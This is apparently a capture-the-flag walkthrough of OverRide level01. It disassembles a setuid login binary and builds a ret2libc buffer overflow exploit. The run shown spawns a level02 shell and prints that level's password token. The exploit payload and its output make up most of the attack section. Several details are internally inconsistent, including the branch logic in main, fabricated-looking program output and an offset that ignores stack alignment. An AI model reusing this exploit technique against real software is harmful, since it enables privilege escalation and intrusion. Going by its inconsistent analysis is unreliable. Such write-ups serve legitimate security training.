# Level01 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level01@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
-rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by level02 user

When executed, runs with level02 privileges

### 2. Test Basic Execution
```bash
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: test
verifying username....

nope, incorrect username...
```
**Observations:**

Program asks for username

Any username results in "incorrect username"

Must find correct username first

## Reverse Engineering
### 3. Function Analysis
```bash
level01@OverRide:~$ gdb level01
(gdb) info functions
All defined functions:
0x08048360  printf@plt
0x08048370  fgets@plt
0x08048380  puts@plt
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
```
### 4. Examining Strings
```bash
(gdb) x/s 0x8048690
0x8048690:      "********* ADMIN LOGIN PROMPT *********"

(gdb) x/s 0x80486b8
0x80486b8:      "----- Welcome "  # Wait, this seems incomplete

(gdb) x/s 0x80486df
0x80486df:      "Enter Username: "

(gdb) x/s 0x80486a8
0x80486a8:      "dat_wil"         # ⭐ This looks like a username!

(gdb) x/s 0x80486b0
0x80486b0:      "admin"           # ⭐ This looks like a password!
```
### 5. Disassembling verify_user_name
```assembly
(gdb) disas verify_user_name
```
```assembly
0x08048464: push   %ebp
0x08048465: mov    %esp,%ebp
0x08048467: push   %edi
0x08048468: push   %esi
0x08048469: sub    $0x10,%esp
0x0804846c: movl   $0x8048690,(%esp)        # "********* ADMIN LOGIN PROMPT *********"
0x08048473: call   0x8048380 <puts@plt>
0x08048478: mov    $0x804a040,%edx           # Our input buffer
0x0804847d: mov    $0x80486a8,%eax           # "dat_wil"
0x08048482: mov    $0x7,%ecx                  # Compare 7 bytes
0x08048487: mov    %edx,%esi
0x08048489: mov    %eax,%edi
0x0804848b: repz cmpsb %es:(%edi),%ds:(%esi) # Compare strings
0x0804848d: seta   %dl
0x08048490: setb   %al
0x08048493: mov    %edx,%ecx
0x08048495: sub    %al,%cl
0x08048497: mov    %ecx,%eax
0x08048499: movsbl %al,%eax
0x0804849c: add    $0x10,%esp
0x0804849f: pop    %esi
0x080484a0: pop    %edi
0x080484a1: pop    %ebp
0x080484a2: ret
```
**Username verification compares with "dat_wil" (7 bytes)**

### 6. Disassembling verify_user_pass
```assembly
(gdb) disas verify_user_pass
```
```assembly
0x080484a3: push   %ebp
0x080484a4: mov    %esp,%ebp
0x080484a6: push   %edi
0x080484a7: push   %esi
0x080484a8: mov    0x8(%ebp),%eax           # Our password input
0x080484ab: mov    %eax,%edx
0x080484ad: mov    $0x80486b0,%eax           # "admin"
0x080484b2: mov    $0x5,%ecx                  # Compare 5 bytes
0x080484b7: mov    %edx,%esi
0x080484b9: mov    %eax,%edi
0x080484bb: repz cmpsb %es:(%edi),%ds:(%esi) # Compare strings
0x080484bd: seta   %dl
0x080484c0: setb   %al
0x080484c3: mov    %edx,%ecx
0x080484c5: sub    %al,%cl
0x080484c7: mov    %ecx,%eax
0x080484c9: movsbl %al,%eax
0x080484cc: pop    %esi
0x080484cd: pop    %edi
0x080484ce: pop    %ebp
0x080484cf: ret
```
**Password verification compares with "admin" (5 bytes)**

### 7. Disassembling main
```assembly
(gdb) disas main
```
```assembly
0x080484d0 <+0>:	push   %ebp
0x080484d1 <+1>:	mov    %esp,%ebp
0x080484d3 <+3>:	push   %edi
0x080484d4 <+4>:	push   %ebx
0x080484d5 <+5>:	and    $0xfffffff0,%esp
0x080484d8 <+8>:	sub    $0x60,%esp

# Clear buffer at esp+0x1c (64 bytes? Actually 0x10 * 4 = 64 bytes)
0x080484db <+11>:	lea    0x1c(%esp),%ebx
0x080484df <+15>:	mov    $0x0,%eax
0x080484e4 <+20>:	mov    $0x10,%edx
0x080484e9 <+25>:	mov    %ebx,%edi
0x080484eb <+27>:	mov    %edx,%ecx
0x080484ed <+29>:	rep stos %eax,%es:(%edi)

0x080484ef <+31>:	movl   $0x0,0x5c(%esp)

# Print welcome message
0x080484f7 <+39>:	movl   $0x80486b8,(%esp)
0x080484fe <+46>:	call   0x8048380 <puts@plt>

# Print "Enter Username: "
0x08048503 <+51>:	mov    $0x80486df,%eax
0x08048508 <+56>:	mov    %eax,(%esp)
0x0804850b <+59>:	call   0x8048360 <printf@plt>

# Read username (256 bytes into global buffer at 0x804a040)
0x08048510 <+64>:	mov    0x804a020,%eax      # stdin
0x08048515 <+69>:	mov    %eax,0x8(%esp)
0x08048519 <+73>:	movl   $0x100,0x4(%esp)    # 256 bytes max
0x08048521 <+81>:	movl   $0x804a040,(%esp)   # Global buffer
0x08048528 <+88>:	call   0x8048370 <fgets@plt>

# Verify username
0x0804852d <+93>:	call   0x8048464 <verify_user_name>
0x08048532 <+98>:	mov    %eax,0x5c(%esp)
0x08048536 <+102>:	cmpl   $0x0,0x5c(%esp)
0x0804853b <+107>:	je     0x8048550 <main+128>

# If username wrong, print error and exit
0x0804853d <+109>:	movl   $0x80486f0,(%esp)  # "nope, incorrect username..."
0x08048544 <+116>:	call   0x8048380 <puts@plt>
0x08048549 <+121>:	mov    $0x1,%eax
0x0804854e <+126>:	jmp    0x80485af <main+223>

# If username correct, continue
0x08048550 <+128>:	movl   $0x804870d,(%esp)  # "Enter Password:"
0x08048557 <+135>:	call   0x8048380 <puts@plt>

# Read password (100 bytes into local buffer at esp+0x1c)
0x0804855c <+140>:	mov    0x804a020,%eax      # stdin
0x08048561 <+145>:	mov    %eax,0x8(%esp)
0x08048565 <+149>:	movl   $0x64,0x4(%esp)    # 100 bytes max
0x0804856d <+157>:	lea    0x1c(%esp),%eax
0x08048571 <+161>:	mov    %eax,(%esp)
0x08048574 <+164>:	call   0x8048370 <fgets@plt>

# Verify password
0x08048579 <+169>:	lea    0x1c(%esp),%eax
0x0804857d <+173>:	mov    %eax,(%esp)
0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
0x08048585 <+181>:	mov    %eax,0x5c(%esp)
0x08048589 <+185>:	cmpl   $0x0,0x5c(%esp)
0x0804858e <+190>:	je     0x8048597 <main+199>
0x08048590 <+192>:	cmpl   $0x0,0x5c(%esp)    # Redundant check
0x08048595 <+197>:	je     0x80485aa <main+218>

# If password wrong, print error and exit
0x08048597 <+199>:	movl   $0x804871e,(%esp)  # "nope, incorrect password..."
0x0804859e <+206>:	call   0x8048380 <puts@plt>
0x080485a3 <+211>:	mov    $0x1,%eax
0x080485a8 <+216>:	jmp    0x80485af <main+223>

# If password correct, success
0x080485aa <+218>:	mov    $0x0,%eax
0x080485af <+223>:	leave
0x080485b0 <+224>:	ret
```
**Note: There's no system("/bin/sh") in this program! The authentication just returns 0 on success.**

## The Vulnerability
### 8. Understanding the Buffer Layout
```text
Local buffer in main at esp+0x1c:
- Size: 64 bytes (0x10 * 4 = 64)
- Used to store password input (fgets reads up to 100 bytes!)
- 100 > 64 → **BUFFER OVERFLOW POSSIBLE!**

Global buffer at 0x804a040:
- Size: 256 bytes
- Used to store username
- Not directly vulnerable to overflow (256 bytes is enough)
```
### 9. The Overflow Potential
```text
Stack layout in main:

Higher addresses
┌──────────────────────────┐
│   return address         │ ← 4 bytes (OUR TARGET)
├──────────────────────────┤
│   saved ebp              │ ← 4 bytes
├──────────────────────────┤
│   ...                    │
├──────────────────────────┤
│   password buffer (64B)  │ ← esp+0x1c (our input)
├──────────────────────────┤
│   ...                    │
└──────────────────────────┘
Lower addresses
With fgets reading up to 100 bytes into a 64-byte buffer, we can overwrite:

The buffer (64 bytes)

Saved EBP (4 bytes)

Return address (4 bytes)

Total needed: 64 + 4 + 4 = 72 bytes to reach return address
```
### 10. Finding the Correct Username
From verify_user_name, the username must be: "dat_wil"

```bash
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Success! Now we can proceed to password.
```
## Exploitation Strategy
### 11. The Goal
Since there's no system("/bin/sh") in the program, we need to:

Overflow the password buffer

Overwrite the return address

Jump to our own shellcode or a useful function

But NX is enabled (stack non-executable), so we can't run shellcode on the stack.

### 12. Finding Useful Functions
The binary has no system function! Let's check:

```bash
(gdb) info functions
0x08048360  printf@plt
0x08048370  fgets@plt
0x08048380  puts@plt
# No system! No execl! No execve!
```
**This changes everything - we need a different approach.**

### 13. Ret2Libc Strategy
Since NX is enabled, we need to use Return-to-libc:

Find address of system() in libc

Find address of "/bin/sh" string

Overwrite return address with system, followed by fake return and argument

But we need libc addresses. Let's find them at runtime.

### 14. Finding System Address
```bash
level01@OverRide:~$ gdb level01
(gdb) break *main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access 16000 bytes of target memory at 0xb7fc5ac9, halting search.
1 pattern found.
```
**Key addresses:**

system: 0xb7e6b060

exit: 0xb7e5ebe0

"/bin/sh": 0xb7f8cc58

### 15. Building the Payload
We need:

64 bytes padding (fill buffer)

4 bytes to overwrite saved EBP

4 bytes return address → system

4 bytes fake return → exit (optional, for clean exit)

4 bytes argument → "/bin/sh"

```python
payload = "A"*64 + "B"*4 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
```
### 16. The Complete Exploit
```bash
# First, provide correct username
# Then, provide the overflow payload

(python -c 'print "dat_wil\n" + "A"*64 + "BBBB" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat) | ./level01
Let's try it:
```
```bash
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*64 + "BBBB" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
## Exploit Visualization
**Stack Layout During Overflow:**
```text
Before overflow:
[password buffer (64B)][saved ebp][return address]
        0-63              64-67      68-71

After overflow:
[A*64][BBBB][system][exit][/bin/sh]
 0-63  64-67  68-71  72-75  76-79
               ↑
        When function returns, jumps to system()
```
## Execution Flow:
Username: "dat_wil" (passes first check)

Password: Overflow payload

Buffer overflow: Overwrites return address with system()

Function returns: Jumps to system("/bin/sh")

Shell obtained: Runs with level02 privileges
